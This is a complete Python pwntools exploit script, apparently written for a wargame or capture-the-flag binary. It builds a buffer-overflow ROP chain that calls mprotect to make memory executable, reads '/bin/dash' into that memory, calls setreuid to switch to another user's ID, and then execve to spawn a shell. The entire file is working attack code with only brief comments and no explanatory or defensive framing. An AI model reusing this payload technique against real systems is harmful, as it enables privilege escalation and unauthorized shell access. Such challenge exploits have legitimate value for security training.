from pwn import *                                                               
                                                                                
# target RWX memory address                                                     
ch34    = 0x400000                                                              
                                                                                
# ROP gadgets
syscall = 0x45eba5
pop_rdx = 0x437205
pop_rax = 0x44d2b4
pop_rdi = 0x4016d3
pop_rsi = 0x4017e7
pop2ret = 0x437229      # pop rdx; pop rsi; ret

# functions()
mprotect = 0x434e10
read = 0x4342a0

# padding overflow
payload = ""
payload += "A" * 280

# mprotect(ch34, 2000, 7) 
# Change permissions to RWX for 2k bytes of memory @ 0x400000
payload += p64(pop_rdi)
payload += p64(ch34)
payload += p64(pop2ret)
payload += p64(0x7)
payload += p64(0x2000)
payload += p64(mprotect)

# read(1, ch34, 9)
# read '/bin/dash' into rwx memory from user input. 
payload += p64(pop_rdi)
payload += p64(0x1)     # stdin
payload += p64(pop2ret)
payload += p64(0x9)     # 9 bytes '/bin/dash'
payload += p64(ch34)    # rwx memory address
payload += p64(read)

# set real & effective UID from 1134 (ch34) to 1234 (ch34-cracked)
# setreuid(1234, 1234)
payload += p64(pop_rax)
payload += p64(0x71) 		# setreuid - 113
payload += p64(pop_rdi) 
payload += p64(1234)		# ruid - 1234 (cracked34)
payload += p64(pop_rsi)          
payload += p64(1234) 		# euid	- 1234 (cracked34)
payload += p64(syscall)              
                       
# execve('/bin/dash', 0, 0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(ch34)        # '/bin/dash'
payload += p64(pop2ret)
payload += p64(0x0)
payload += p64(0x0)    
payload += p64(syscall)
                       
print payload
